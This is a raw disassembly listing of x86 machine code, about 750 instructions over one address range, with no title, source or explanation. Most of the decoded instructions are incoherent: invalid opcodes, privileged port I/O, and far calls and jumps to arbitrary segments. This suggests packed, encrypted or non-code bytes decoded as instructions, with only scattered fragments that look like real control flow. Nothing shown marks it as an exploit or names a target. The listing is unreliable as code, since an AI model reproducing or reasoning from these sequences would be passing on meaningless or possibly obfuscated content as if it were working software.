  41a796:	xor    BYTE PTR [ecx],al
  41a798:	add    BYTE PTR [eax-0x4b000000],dh
  41a79e:	(bad)  
  41a79f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7a0:	mov    esi,0x34d66a61
  41a7a5:	(bad)
  41a7a8:	jo     0x41a75c
  41a7aa:	xchg   esi,eax
  41a7ab:	or     BYTE PTR [esp+eax*4-0x20],bh
  41a7af:	out    0x21,al
  41a7b1:	call   0x5ccb:0xd0b7cc88
  41a7b8:	pop    ebp
  41a7b9:	hlt    
  41a7ba:	push   ecx
  41a7bb:	retf   0x8316
  41a7be:	call   ebp
  41a7c0:	inc    eax
  41a7c1:	xchg   esp,eax
  41a7c2:	out    dx,eax
  41a7c3:	popa   
  41a7c4:	out    0xc4,al
  41a7c6:	shl    ebp,cl
  41a7c8:	lahf   
  41a7c9:	mov    eax,0x9f4148c7
  41a7ce:	jecxz  0x41a76b
  41a7d0:	push   esp
  41a7d1:	loop   0x41a77c
  41a7d3:	int    0xc0
  41a7d5:	mov    ah,0xd2
  41a7d7:	push   es
  41a7d8:	mov    eax,ds:0x66ea9743
  41a7dd:	jmp    0x16f093c7
  41a7e2:	pop    ecx
  41a7e3:	pop    edx
  41a7e4:	std    
  41a7e5:	xchg   ecx,eax
  41a7e6:	push   ebp
  41a7e7:	dec    edi
  41a7e8:	imul   ebx,DWORD PTR [edx-0x7f139c88],0xffffffe9
  41a7ef:	rcr    DWORD PTR [edx+0x2f],1
  41a7f2:	dec    ebx
  41a7f3:	pop    esi
  41a7f4:	jo     0x41a7b1
  41a7f6:	out    0xb4,al
  41a7f8:	sbb    eax,0xfd2da67e
  41a7fd:	and    DWORD PTR [ebp+0x4b],esp
  41a800:	adc    DWORD PTR [ebp-0x4b291787],edi
  41a806:	push   edi
  41a807:	mov    bl,0x34
  41a809:	mov    ds:0xc0562fb3,eax
  41a80e:	cli    
  41a80f:	popa   
  41a810:	or     edi,DWORD PTR [eax-0x5e]
  41a813:	pop    edx
  41a814:	shr    esi,1
  41a816:	and    al,0x41
  41a818:	jae    0x41a7f7
  41a81a:	aad    0xf5
  41a81c:	je     0x41a83c
  41a81e:	(bad)  
  41a81f:	fnstenv [ecx]
  41a821:	gs fwait
  41a823:	and    eax,0x33d4c230
  41a828:	mov    WORD PTR [ebp+0xc],es
  41a82b:	pusha  
  41a82c:	xchg   ebx,eax
  41a82d:	pop    edx
  41a82e:	dec    edi
  41a82f:	mov    eax,0x35e055be
  41a834:	mov    ch,0x29
  41a836:	mov    dl,BYTE PTR [edi]
  41a838:	inc    ebx
  41a839:	popf   
  41a83a:	rcr    BYTE PTR [ebp-0x68896078],0x59
  41a841:	imul   eax,DWORD PTR [ecx],0x36e36571
  41a847:	in     al,0xf5
  41a849:	sub    BYTE PTR [ecx+0x7a05da33],0x96
  41a850:	(bad)  
  41a851:	call   DWORD PTR [edx-0x7f]
  41a854:	shr    eax,1
  41a856:	sar    bh,cl
  41a858:	call   DWORD PTR [ecx+0x50]
  41a85b:	jmp    0x41a928
  41a860:	(bad)  
  41a861:	std    
  41a862:	pop    es
  41a863:	and    eax,0xfff6ff2f
  41a868:	popf   
  41a869:	adc    DWORD PTR [eax+0x3f],edx
  41a86c:	pop    esi
  41a86d:	test   al,0xcf
  41a86f:	mov    eax,ds:0x131a9
  41a874:	mov    al,0x0
  41a876:	add    BYTE PTR [eax],al
  41a878:	setae  bh
  41a87b:	sbb    cl,BYTE PTR [edi+0x21]
  41a87e:	pop    eax
  41a87f:	test   BYTE PTR [ebx-0x24ed2e4],cl
  41a885:	imul   eax,esi,0xffffffb5
  41a888:	mov    ds:0xd8222b2a,eax
  41a88d:	mov    DWORD PTR [ebp-0x4f],0x83a3b48c
  41a894:	mov    esp,0x24060bc8
  41a899:	mov    DWORD PTR [edi-0x3ea5ee5e],eax
  41a89f:	mov    bl,0xf9
  41a8a1:	scas   eax,DWORD PTR es:[edi]
  41a8a2:	or     dh,BYTE PTR [ebp+0x5d]
  41a8a5:	lahf   
  41a8a6:	pop    ss
  41a8a7:	push   ecx
  41a8a8:	pop    edx
  41a8a9:	ficomp DWORD PTR [eax+0x5a11a4aa]
  41a8af:	outs   dx,BYTE PTR ds:[esi]
  41a8b0:	cwde   
  41a8b1:	lock loopne 0x41a8c4
  41a8b4:	pop    ebp
  41a8b5:	(bad)  
  41a8b6:	mov    ecx,edx
  41a8b8:	or     ah,al
  41a8ba:	neg    DWORD PTR [edi-0x76]
  41a8bd:	ficom  DWORD PTR [edx+0x1f]
  41a8c0:	dec    ebx
  41a8c1:	push   esp
  41a8c2:	jmp    0xf4d7dcc7
  41a8c7:	xor    BYTE PTR [edx-0x3],dh
  41a8ca:	lods   al,BYTE PTR ds:[esi]
  41a8cb:	pop    esp
  41a8cc:	jle    0x41a949
  41a8ce:	cmc    
  41a8cf:	sub    ecx,DWORD PTR [edi+0xa3e797e]
  41a8d5:	pop    esp
  41a8d6:	pop    es
  41a8d7:	xchg   esp,eax
  41a8d8:	scas   al,BYTE PTR es:[edi]
  41a8d9:	mov    esi,0x2032656e
  41a8de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8df:	and    ecx,DWORD PTR [ebx-0x5a]
  41a8e2:	test   DWORD PTR [esi+0x17],esp
  41a8e5:	cmp    BYTE PTR [edi+ebp*4],dh
  41a8e8:	dec    eax
  41a8e9:	adc    esi,esp
  41a8eb:	iret   
  41a8ec:	aaa    
  41a8ed:	bound  ebx,QWORD PTR [ecx-0x3f]
  41a8f0:	cmp    ah,BYTE PTR [edi-0x7d]
  41a8f3:	scas   eax,DWORD PTR es:[edi]
  41a8f4:	call   0xd812:0x392c1998
  41a8fb:	aam    0xb4
  41a8fd:	ffree  st(3)
  41a8ff:	test   al,0xf1
  41a901:	xor    BYTE PTR [ebp-0x33ed4e53],bl
  41a907:	es pop ebp
  41a909:	iret   
  41a90a:	inc    edi
  41a90b:	inc    ebx
  41a90c:	loope  0x41a8fd
  41a90e:	jno    0x41a96f
  41a910:	mov    dh,0xa7
  41a912:	pop    edx
  41a913:	or     dl,BYTE PTR [eax]
  41a915:	mov    dl,0xa5
  41a917:	ret    0xc47b
  41a91a:	pop    esp
  41a91b:	fwait
  41a91c:	ss aam 0xd3
  41a91f:	push   ds
  41a920:	jns    0x41a965
  41a922:	sbb    BYTE PTR [ecx],0x6c
  41a925:	nop
  41a926:	dec    edi
  41a927:	pop    es
  41a928:	call   0x423dad
  41a92d:	mov    ecx,eax
  41a92f:	mov    eax,DWORD PTR [ebp-0x18]
  41a932:	jmp    0x41a9ff
  41a937:	pop    ebx
  41a938:	fwait
  41a939:	xchg   ebx,eax
  41a93a:	mov    edi,0xff7fbfd3
  41a93f:	cwde   
  41a940:	push   0xffffff93
  41a942:	add    bh,dh
  41a944:	repz addr16 int 0x59
  41a948:	xor    al,BYTE PTR [ecx]
  41a94a:	add    BYTE PTR [eax+0x7000000],dh
  41a950:	jne    0x41a975
  41a952:	cmp    bh,0xa
  41a955:	pop    esi
  41a956:	adc    DWORD PTR [edx-0x48],esi
  41a959:	sbb    dh,BYTE PTR [edx-0x62b0f8f8]
  41a95f:	cmp    eax,0xa20fc3f8
  41a964:	es mov dl,0xb4
  41a967:	mov    ecx,0x1289ce7c
  41a96c:	out    0x32,eax
  41a96e:	xor    bh,BYTE PTR [ecx-0xa]
  41a971:	jp     0x41a97f
  41a973:	sub    ch,ah
  41a975:	cmp    ch,BYTE PTR [ebx]
  41a977:	into   
  41a978:	out    dx,al
  41a979:	pop    edi
  41a97a:	outs   dx,BYTE PTR ds:[esi]
  41a97b:	test   eax,0xd8138924
  41a980:	push   eax
  41a981:	test   eax,0x16154fb8
  41a986:	out    dx,eax
  41a987:	aad    0x28
  41a989:	mov    ds:0xbd88df0d,eax
  41a98e:	fs ffree st(7)
  41a991:	and    eax,0x17306fb7
  41a996:	sub    bh,BYTE PTR [ecx-0x4]
  41a999:	imul   ecx,DWORD PTR [edi],0x85668532
  41a99f:	push   ss
  41a9a0:	stc    
  41a9a1:	in     al,0xab
  41a9a3:	jbe    0x41a931
  41a9a5:	xor    DWORD PTR [ebp-0x2],ebp
  41a9a8:	jmp    0x2559:0xeceaa280
  41a9af:	dec    ecx
  41a9b0:	dec    ebp
  41a9b1:	cmp    eax,0x368b05e0
  41a9b6:	ja     0x41a9de
  41a9b8:	sbb    BYTE PTR [edx-0x21e805dc],bl
  41a9be:	mov    eax,0x85d55ac5
  41a9c3:	ja     0x41aa24
  41a9c5:	popf   
  41a9c6:	imul   ecx,edx,0xffffff80
  41a9c9:	bound  esi,QWORD PTR [edi-0x2b]
  41a9cc:	fldenv [ecx-0x5ad448a9]
  41a9d2:	je     0x41a99a
  41a9d4:	sbb    ebx,DWORD PTR [ecx+0x2a3dbeac]
  41a9da:	ret    0xf97d
  41a9dd:	pusha  
  41a9de:	jmp    0x41a964
  41a9e0:	cli    
  41a9e1:	inc    ecx
  41a9e2:	mov    dl,0x61
  41a9e4:	rcr    ecx,1
  41a9e6:	(bad)  
  41a9e7:	ret    
  41a9e8:	mov    ecx,0x5e84fb06
  41a9ed:	sbb    bh,BYTE PTR [eax+0x22]
  41a9f0:	into   
  41a9f1:	rol    edi,cl
  41a9f3:	test   eax,0xa01d4560
  41a9f8:	mov    al,bl
  41a9fa:	and    al,0x63
  41a9fc:	push   ebx
  41a9fd:	adc    edi,DWORD PTR [edx]
  41a9ff:	mov    ebx,DWORD PTR [ebp-0x14]
  41aa02:	add    ecx,eax
  41aa04:	jmp    0x41aad1
  41aa09:	xchg   ebx,eax
  41aa0a:	dec    ebp
  41aa0b:	retf   0xde2a
  41aa0e:	scas   eax,DWORD PTR es:[edi]
  41aa0f:	repz std 
  41aa11:	mul    BYTE PTR ds:0xf1a9a1c2
  41aa17:	test   BYTE PTR [ebx],dh
  41aa19:	or     DWORD PTR [ebx],esi
  41aa1b:	add    DWORD PTR [eax],eax
  41aa1d:	mov    al,0x0
  41aa1f:	add    BYTE PTR [eax],al
  41aa21:	xlat   BYTE PTR ds:[ebx]
  41aa22:	xchg   esi,eax
  41aa23:	stos   BYTE PTR es:[edi],al
  41aa24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa25:	mov    al,0x47
  41aa27:	xor    al,0x72
  41aa29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa2a:	push   eax
  41aa2b:	or     BYTE PTR [eax],al
  41aa2d:	inc    esi
  41aa2e:	add    al,0xb4
  41aa30:	sub    BYTE PTR [edi+0x4146131f],ch
  41aa36:	xor    al,0x5b
  41aa38:	or     bl,BYTE PTR [edi+0x6a]
  41aa3b:	out    0xe1,eax
  41aa3d:	mov    es,WORD PTR [ebx+0x1c]
  41aa40:	adc    al,0x54
  41aa42:	arpl   WORD PTR [edx+0x71],bp
  41aa45:	or     eax,DWORD PTR [edi-0x7d]
  41aa48:	rcr    dl,0xd1
  41aa4b:	or     BYTE PTR [esp+ebx*1+0x2565944b],bl
  41aa52:	pop    esi
  41aa53:	adc    DWORD PTR [ecx-0x25],eax
  41aa56:	pusha  
  41aa57:	sub    al,0x87
  41aa59:	std    
  41aa5a:	mov    ch,0xcd
  41aa5c:	xchg   esi,eax
  41aa5d:	xchg   esi,eax
  41aa5e:	outs   dx,DWORD PTR ds:[esi]
  41aa5f:	std    
  41aa60:	ret    
  41aa61:	aad    0x2
  41aa63:	(bad)  
  41aa64:	or     DWORD PTR [esi-0x75a8a3e1],edx
  41aa6a:	les    esi,FWORD PTR [esp+eax*4]
  41aa6d:	pushf  
  41aa6e:	push   esi
  41aa6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa70:	jns    0x41aac3
  41aa72:	adc    ebp,ecx
  41aa74:	dec    edi
  41aa75:	(bad)  
  41aa76:	xlat   BYTE PTR ds:[ebx]
  41aa77:	xor    ebx,edx
  41aa79:	push   ebp
  41aa7a:	daa    
  41aa7b:	jcxz   0x41aa8f
  41aa7e:	sub    ebx,0xffffff8e
  41aa81:	sub    DWORD PTR [edi-0x1d54be1f],ecx
  41aa87:	out    0xd0,eax
  41aa89:	mov    cl,0xe2
  41aa8b:	sbb    ebp,eax
  41aa8d:	mov    ecx,0xa7b3876e
  41aa92:	and    eax,0xb02a7f98
  41aa97:	lahf   
  41aa98:	test   BYTE PTR [edi],ch
  41aa9a:	mov    dl,cl
  41aa9c:	xchg   al,ah
  41aa9e:	nop    DWORD PTR [eax+ebp*2+0x62c71e50]
  41aaa6:	popa   
  41aaa7:	or     al,0xa5
  41aaa9:	arpl   WORD PTR ds:0xe9d9435f,sp
  41aaaf:	inc    edx
  41aab0:	mov    ah,0x10
  41aab2:	add    dl,BYTE PTR [ebx+0x5c90d399]
  41aab8:	cdq    
  41aab9:	mov    ah,0xb9
  41aabb:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41aabd:	in     al,0x84
  41aabf:	popf   
  41aac0:	add    dh,BYTE PTR [esi]
  41aac2:	adc    DWORD PTR ds:0x26be7f88,ecx
  41aac8:	call   0xd4c9:0x67463b17
  41aacf:	jmp    0xa4c1:0x81d3134c
  41aad6:	retf   0xffff
  41aad9:	adc    edx,0xffffffff
  41aadc:	mov    eax,DWORD PTR [ebp+0xc]
  41aadf:	mov    DWORD PTR [eax],ecx
  41aae1:	mov    DWORD PTR [eax+0x4],edx
  41aae4:	mov    eax,DWORD PTR [ebp-0x38]
  41aae7:	mov    ecx,DWORD PTR [ebp-0x34]
  41aaea:	mov    edx,DWORD PTR [ebp-0x40]
  41aaed:	jmp    0x41abba
  41aaf2:	sbb    dh,BYTE PTR [edi-0x6b]
  41aaf5:	lods   eax,DWORD PTR ds:[esi]
  41aaf6:	std    
  41aaf7:	out    dx,eax
  41aaf8:	cmp    dh,bh
  41aafa:	std    
  41aafb:	xchg   esp,eax
  41aafc:	push   esi
  41aafd:	jp     0x41aa87
  41aaff:	ret    0x3875
  41ab02:	mov    ecx,0xb0000133
  41ab07:	add    BYTE PTR [eax],al
  41ab09:	add    BYTE PTR [edx+0x335a2d81],al
  41ab0f:	in     eax,0x0
  41ab11:	cmp    DWORD PTR [ecx-0x10],esp
  41ab14:	jae    0x41ab3a
  41ab16:	jmp    0xc4b9e988
  41ab1b:	ss fucompp 
  41ab1e:	pushf  
  41ab1f:	pop    ecx
  41ab20:	and    edx,DWORD PTR ds:[eax]
  41ab23:	mul    ah
  41ab25:	dec    esi
  41ab26:	ret    
  41ab27:	retf   0xe366
  41ab2a:	sub    eax,0x70f94309
  41ab2f:	sti    
  41ab30:	ret    
  41ab31:	jo     0x41aafd
  41ab33:	pop    es
  41ab34:	or     al,0x42
  41ab36:	cld    
  41ab37:	add    eax,ebp
  41ab39:	daa    
  41ab3a:	xor    eax,0x7db02690
  41ab3f:	cmp    BYTE PTR [ebp-0x2f129894],dl
  41ab45:	int3   
  41ab46:	or     al,cl
  41ab48:	sub    BYTE PTR [edx+0x2c],al
  41ab4b:	imul   DWORD PTR [ebx+edi*8-0x72af44ef]
  41ab52:	adc    DWORD PTR [ecx],edx
  41ab54:	xchg   ebx,eax
  41ab55:	popa   
  41ab56:	sahf   
  41ab57:	xchg   esp,eax
  41ab58:	fs out dx,eax
  41ab5a:	mov    ebx,0x5f008b21
  41ab5f:	jge    0x41abdf
  41ab61:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41ab63:	dec    ebp
  41ab64:	scas   eax,DWORD PTR es:[edi]
  41ab65:	out    0x35,eax
  41ab67:	xchg   ecx,eax
  41ab68:	pusha  
  41ab69:	sar    al,1
  41ab6b:	out    dx,eax
  41ab6c:	retf   
  41ab6d:	call   0x3968:0x469204ac
  41ab74:	lea    ebx,[esi-0x7e201a78]
  41ab7a:	add    al,BYTE PTR [ebx]
  41ab7c:	leave  
  41ab7d:	push   eax
  41ab7e:	dec    edi
  41ab7f:	jg     0x41abb2
  41ab81:	mov    ah,ah
  41ab83:	add    cl,BYTE PTR [ecx-0x3c36c07a]
  41ab89:	ds mov ebx,0xf79e42f5
  41ab8f:	aaa    
  41ab90:	clc    
  41ab91:	adc    DWORD PTR [esp+eax*4+0x5831738e],ebp
  41ab98:	js     0x41abd1
  41ab9a:	sub    al,0x22
  41ab9c:	and    al,BYTE PTR [edx+ebp*4-0x161caf4c]
  41aba3:	xlat   BYTE PTR ds:[ebx]
  41aba4:	push   ss
  41aba5:	imul   edx,DWORD PTR [esi-0x69],0xffffffeb
  41aba9:	pushf  
  41abaa:	pop    ebx
  41abab:	pop    ss
  41abac:	sub    al,0x81
  41abae:	mov    eax,ds:0x1cafc1de
  41abb3:	xor    ch,BYTE PTR [ebx+0x7dfc9b3a]
  41abb9:	cmp    cl,BYTE PTR [ebx-0x4dda3ba3]
  41abbf:	push   ss
  41abc0:	add    BYTE PTR [eax],al
  41abc2:	jmp    0x41ac8f
  41abc7:	xchg   esi,eax
  41abc8:	dec    esi
  41abc9:	jns    0x41abb0
  41abcb:	stc    
  41abcc:	neg    DWORD PTR [esi-0x35faf881]
  41abd2:	mov    ebx,0xe488078a
  41abd7:	imul   esi,DWORD PTR [ecx+eax*1],0xb000
  41abde:	add    BYTE PTR [edx-0x58],bh
  41abe1:	pop    ebp
  41abe2:	dec    ebx
  41abe3:	(bad)  
  41abe4:	push   edi
  41abe5:	jmp    0xa8721c0
  41abea:	js     0x41ac33
  41abec:	mov    eax,ss:0xa5a34e37
  41abf2:	addr16 add eax,0x170b6f72
  41abf8:	inc    ecx
  41abf9:	or     eax,0x90b58e71
  41abfe:	add    al,0x81
  41ac00:	addr16 mov dl,0xd4
  41ac03:	sub    BYTE PTR [ecx],bl
  41ac05:	pop    esp
  41ac06:	mov    eax,ds:0x5a82f16
  41ac0b:	lahf   
  41ac0c:	mov    ebx,0x6dbba2fe
  41ac11:	inc    ebp
  41ac12:	jecxz  0x41ac38
  41ac14:	inc    ebp
  41ac15:	fstp   DWORD PTR ds:0x537adc7b
  41ac1b:	ret    0x5d56
  41ac1e:	icebp  
  41ac1f:	push   ds
  41ac20:	push   ecx
  41ac21:	mov    edi,db4
  41ac24:	in     al,0x66
  41ac26:	jno    0x41aca2
  41ac28:	outs   dx,DWORD PTR ds:[esi]
  41ac29:	and    ecx,DWORD PTR [ebx]
  41ac2b:	dec    ebx
  41ac2c:	out    dx,eax
  41ac2d:	jno    0x41ac77
  41ac2f:	test   bl,bl
  41ac31:	xlat   BYTE PTR ds:[ebx]
  41ac32:	jge    0x41ac18
  41ac34:	adc    edi,edi
  41ac36:	stos   DWORD PTR es:[edi],eax
  41ac37:	inc    esp
  41ac39:	push   ds
  41ac3a:	retf   0x87fb
  41ac3d:	mov    DWORD PTR [ecx+0x25],ebx
  41ac40:	mov    bh,0xd0
  41ac42:	nop    ebp
  41ac45:	pop    edi
  41ac46:	inc    edi
  41ac47:	dec    esp
  41ac48:	outs   dx,DWORD PTR ds:[esi]
  41ac49:	mov    WORD PTR [esi-0x5a9bb2aa],fs
  41ac4f:	lock icebp 
  41ac51:	inc    edx
  41ac52:	mov    eax,0x2349e691
  41ac57:	rcl    BYTE PTR [edi-0x2b285389],0xef
  41ac5e:	xor    ah,BYTE PTR [esi+0x36]
  41ac61:	jecxz  0x41ac0c
  41ac63:	sahf   
  41ac64:	mov    ah,0xab
  41ac66:	dec    ecx
  41ac67:	fwait
  41ac68:	sbb    BYTE PTR [edi+0x11],cl
  41ac6b:	and    al,0x2d
  41ac6d:	cmp    eax,0x3a2b8b3a
  41ac72:	out    dx,al
  41ac73:	loop   0x41ac4a
  41ac75:	test   al,0x1b
  41ac77:	xchg   BYTE PTR [ebx+0x23607534],ch
  41ac7d:	std    
  41ac7e:	cli    
  41ac7f:	cdq    
  41ac80:	gs and al,0xfa
  41ac83:	push   ebp
  41ac84:	add    al,dl
  41ac86:	adc    edx,DWORD PTR [ecx]
  41ac88:	push   esi
  41ac89:	jno    0x41aca8
  41ac8b:	cmp    al,ah
  41ac8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac8e:	div    DWORD PTR [ebx]
  41ac90:	ret    0x558b
  41ac93:	mov    eax,0xc8e9
  41ac98:	add    BYTE PTR [ebx],bl
  41ac9a:	adc    al,0xae
  41ac9c:	das    
  41ac9d:	scas   eax,DWORD PTR es:[edi]
  41ac9e:	mov    edi,0x39bf349b
  41aca3:	ins    DWORD PTR es:[edi],dx
  41aca4:	in     al,0x2c
  41aca6:	jo     0x41ac30
  41aca8:	pop    edi
  41aca9:	sbb    DWORD PTR ds:0xb00001,esi
  41acaf:	add    BYTE PTR [eax],al
  41acb1:	in     al,0x40
  41acb3:	ds test eax,0x3fe01af3
  41acb9:	lock sti 
  41acbb:	ins    DWORD PTR es:[edi],dx
  41acbc:	push   ebx
  41acbd:	push   0x7033460a
  41acc2:	sbb    eax,DWORD PTR ds:0x3df61d92
  41acc8:	lea    eax,cs:[ebx+0x46536fff]
  41accf:	push   esi
  41acd0:	sub    ah,BYTE PTR [eax+0x27]
  41acd3:	sbb    al,0x50
  41acd5:	das    
  41acd6:	cmc    
  41acd7:	cs das 
  41acd9:	std    
  41acda:	scas   al,BYTE PTR es:[edi]
  41acdb:	sub    BYTE PTR [edi],bh
  41acdd:	mov    eax,0x8ef02dc7
  41ace2:	push   0x1f
  41ace4:	mov    ebx,0xa3cb0014
  41ace9:	dec    ebx
  41acea:	loop   0x41ac71
  41acec:	call   0x7fdd7b38
  41acf1:	aas    
  41acf2:	cmp    al,0xbd
  41acf4:	sub    bh,BYTE PTR [edi-0x10ce706a]
  41acfa:	mov    ecx,0x50cfd243
  41acff:	dec    esi
  41ad00:	jmp    0x3a980bc0
  41ad05:	cmp    cl,BYTE PTR [ebp+0x12]
  41ad08:	nop
  41ad09:	xchg   esp,eax
  41ad0a:	js     0x41ad6b
  41ad0c:	repz fstp DWORD PTR [ebp+ecx*8+0xf8dfc4a]
  41ad14:	cmp    esp,DWORD PTR [edx+0x10]
  41ad17:	test   BYTE PTR [esp+ebx*2-0x66c22245],al
  41ad1e:	fdiv   st(3),st
  41ad20:	ins    DWORD PTR es:[edi],dx
  41ad21:	mov    ah,0x7e
  41ad23:	std    
  41ad24:	mov    dl,0xfa
  41ad26:	adc    ah,bl
  41ad28:	stos   BYTE PTR es:[edi],al
  41ad29:	pop    ds
  41ad2a:	xchg   BYTE PTR [esi+ebp*1-0x74],dh
  41ad2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad2f:	mov    dl,BYTE PTR ds:0xd1688ad
  41ad35:	pop    eax
  41ad36:	pop    DWORD PTR [ecx]
  41ad38:	xchg   ebp,eax
  41ad39:	std    
  41ad3a:	rcr    edi,1
  41ad3c:	popa   
  41ad3d:	mov    eax,0x510c378a
  41ad42:	xchg   edi,eax
  41ad43:	inc    ebx
  41ad44:	pop    esp
  41ad45:	dec    ebx
  41ad46:	call   0x16e39c7a
  41ad4b:	fnstenv ds:0xbf2a0b89
  41ad51:	lahf   
  41ad52:	cmp    dh,BYTE PTR [ecx]
  41ad54:	push   edi
  41ad55:	vsubsd xmm7,xmm3,QWORD PTR [esi]
  41ad59:	xor    dl,BYTE PTR [esi+0x461f6f7c]
  41ad5f:	xor    BYTE PTR [ecx-0x7f],dh
  41ad62:	loope  0x41add0
  41ad64:	inc    edi
  41ad65:	add    BYTE PTR [eax],al
  41ad67:	xor    ecx,ebx
  41ad69:	mov    ebx,DWORD PTR [ebp-0x44]
  41ad6c:	jmp    0x41ae39
  41ad71:	(bad)  
  41ad73:	cmp    BYTE PTR [eax+0x7c],ah
  41ad76:	arpl   WORD PTR [edi+0x7f],bx
  41ad79:	(bad)  
  41ad7a:	pop    ss
  41ad7b:	jmp    0x41ad4a
  41ad7d:	mov    bh,0x6b
  41ad7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad80:	mov    cs,ecx
  41ad82:	xor    eax,0xb00001
  41ad87:	add    BYTE PTR [eax],al
  41ad89:	fld    DWORD PTR [esi]
  41ad8b:	(bad)  
  41ad8d:	xor    esi,ebp
  41ad8f:	mov    DWORD PTR [esi],edx
  41ad91:	icebp  
  41ad92:	push   ds
  41ad93:	mov    al,0x97
  41ad95:	mov    bl,0x79
  41ad97:	push   ecx
  41ad98:	push   esi
  41ad99:	cmp    BYTE PTR ds:0x1c238c8a,bl
  41ad9f:	mov    ch,0x74
  41ada1:	push   edi
  41ada2:	cdq    
  41ada3:	jle    0x41ade9
  41ada5:	mov    DWORD PTR [eax-0x6f44c60],esi
  41adab:	xor    ebp,ebp
  41adad:	mov    dh,cl
  41adaf:	xor    DWORD PTR [ebp+0x40],esp
  41adb2:	inc    edi
  41adb3:	push   esi
  41adb4:	xchg   esp,eax
  41adb5:	xor    BYTE PTR [ecx+0x3a],ah
  41adb8:	test   DWORD PTR [esi-0x6b],esi
  41adbb:	loope  0x41adc2
  41adbd:	and    DWORD PTR [eax+0x5d],edx
  41adc0:	stc    
  41adc1:	lahf   
  41adc2:	outs   dx,BYTE PTR ds:[esi]
  41adc3:	or     DWORD PTR [ebx],edi
  41adc5:	lods   eax,DWORD PTR ds:[esi]
  41adc6:	xchg   ebx,eax
  41adc7:	pop    ds
  41adc8:	aad    0x33
  41adca:	mov    dl,0x1
  41adcc:	ss repz jmp 0xa6dc:0x4ae81edb
  41add5:	push   DWORD PTR [eax]
  41add7:	loopne 0x41ad82
  41add9:	adc    eax,0x732b4126
  41adde:	retf   
  41addf:	clc    
  41ade0:	cwde   
  41ade1:	and    dl,cl
  41ade3:	jle    0x41adfc
  41ade5:	aam    0x2a
  41ade7:	cdq    
  41ade8:	cmp    edi,esi
  41adea:	mov    dl,BYTE PTR [eax-0x58]
  41aded:	inc    edi
  41adee:	jbe    0x41ade1
  41adf0:	sar    DWORD PTR [ebx-0x54],1
  41adf3:	pop    esi
  41adf4:	pop    edx
  41adf5:	mov    edx,0x2a24006
  41adfa:	fild   DWORD PTR [ebx-0x5691028]
  41ae00:	pop    ecx
  41ae01:	sub    DWORD PTR [ebx-0xd],edx
  41ae04:	xchg   edx,eax
  41ae05:	mul    bh
  41ae07:	jp     0x41addc
  41ae09:	pop    esp
  41ae0a:	or     DWORD PTR [edx-0x279a523e],0xffffffae
  41ae11:	xchg   ecx,eax
  41ae12:	xor    ch,BYTE PTR [eax-0x34]
  41ae15:	mov    ds:0xc01bd0ed,al
  41ae1a:	pop    es
  41ae1b:	arpl   WORD PTR [eax+0x374b9e61],dx
  41ae21:	addr16 clc 
  41ae23:	dec    eax
  41ae24:	ins    BYTE PTR es:[edi],dx
  41ae25:	jns    0x41aea2
  41ae27:	scas   al,BYTE PTR es:[edi]
  41ae28:	mov    al,dh
  41ae2a:	addr16 mov bh,0x6a
  41ae2d:	sbb    eax,ecx
  41ae2f:	ins    BYTE PTR es:[edi],dx
  41ae30:	ret    
  41ae31:	(bad)  
  41ae32:	aaa    
  41ae33:	ret    0xb54c
  41ae36:	les    edx,FWORD PTR [esi]
  41ae38:	sub    al,0x5
  41ae3a:	test   DWORD PTR [edi+edi*8+0x3ad181ff],esp
  41ae41:	into   
  41ae42:	(bad)  
  41ae43:	dec    DWORD PTR [ebx]
  41ae45:	ret    0xc8e9
  41ae48:	add    BYTE PTR [eax],al
  41ae4a:	add    BYTE PTR [edi-0xc0e2c6b],ah
  41ae50:	mul    DWORD PTR [edi-0x7cba3229]
  41ae56:	in     al,0x9
  41ae58:	mov    ds:0x367970c4,eax
  41ae5d:	add    DWORD PTR [eax],eax
  41ae5f:	mov    al,0x0
  41ae61:	add    BYTE PTR [eax],al
  41ae63:	shl    eax,0xc2
  41ae66:	in     al,0xc4
  41ae68:	xor    BYTE PTR [esi+0x48],ah
  41ae6b:	test   DWORD PTR [esp+eiz*2],edx
  41ae6e:	push   edx
  41ae6f:	dec    edi
  41ae70:	dec    esp
  41ae71:	iret   
  41ae72:	stc    
  41ae73:	fcomp  QWORD PTR [edi-0x4b]
  41ae76:	jne    0x41aeed
  41ae78:	aam    0x4a
  41ae7a:	jns    0x41ae9d
  41ae7c:	mov    cl,0xcf
  41ae7e:	call   0xcd96a293
  41ae83:	push   0x1c0e26e8
  41ae88:	int3   
  41ae89:	outs   dx,BYTE PTR fs:[esi]
  41ae8b:	or     eax,0xb7eca763
  41ae90:	loope  0x41ae5d
  41ae92:	sbb    DWORD PTR [edi-0x75],ecx
  41ae95:	pop    ecx
  41ae96:	(bad)  
  41ae97:	popf   
  41ae98:	loopne 0x41ae98
  41ae9a:	test   DWORD PTR [edx+0x51],0x8ac4b8ae
  41aea1:	xchg   esi,eax
  41aea2:	clc    
  41aea3:	mov    ds:0x886e4e67,al
  41aea8:	jge    0x41ae5e
  41aeaa:	dec    esp
  41aeab:	addr16 push esi
  41aead:	inc    edx
  41aeae:	ja     0x41ae9c
  41aeb0:	jmp    0xc75d:0x53c5bb4f
  41aeb7:	add    BYTE PTR [edx-0x3b2892eb],0xda
  41aebe:	cli    
  41aebf:	xchg   edx,eax
  41aec0:	push   esp
  41aec1:	xor    al,0xb7
  41aec3:	xchg   ecx,eax
  41aec4:	sub    esi,DWORD PTR ds:0xe13782bc
  41aeca:	ins    BYTE PTR es:[edi],dx
  41aecb:	mov    eax,ds:0xd5290601
  41aed0:	fstp   DWORD PTR [edi+edx*1+0xc]
  41aed4:	mov    edx,0xc61a356e
  41aed9:	push   ebx
  41aeda:	xchg   edi,eax
  41aedb:	xor    al,0x6e
  41aedd:	fild   QWORD PTR [ecx-0x51]
  41aee0:	js     0x41af37
  41aee2:	mov    eax,0x4b688e6d
  41aee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aee8:	xchg   ebp,eax
  41aee9:	mov    dh,0xa2
